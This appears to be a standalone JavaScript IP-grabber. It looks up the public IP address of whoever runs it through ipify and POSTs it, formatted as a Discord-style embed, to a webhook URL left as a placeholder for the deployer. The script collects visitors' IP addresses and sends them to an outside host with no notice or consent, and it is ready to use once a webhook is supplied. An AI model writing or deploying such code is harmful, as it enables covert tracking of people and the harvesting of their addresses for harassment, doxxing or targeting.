var ip = '';
fetch('https://api.ipify.org?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    console.log('Retrieved IP:', ip); 

    var webhook = 'Your webhook URL';
    var message = {
      embeds: [
        {
          title: 'IP Address',
          description: getDescription(ip),
          footer: {
            text: new Date().toLocaleString()
          },
          color: 16711680
        }
      ]
    };

    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
      .then(function(response) {
        if (response.ok) {
          console.log('Webhook sent successfully!');
        } else {
          console.log('Unable to send webhook. Status:', response.status);
        }
      })
      .catch(function(error) {
        console.error('Error sending webhook:', error);
      });
  });

function getDescription(ip) {
    return ip;
}
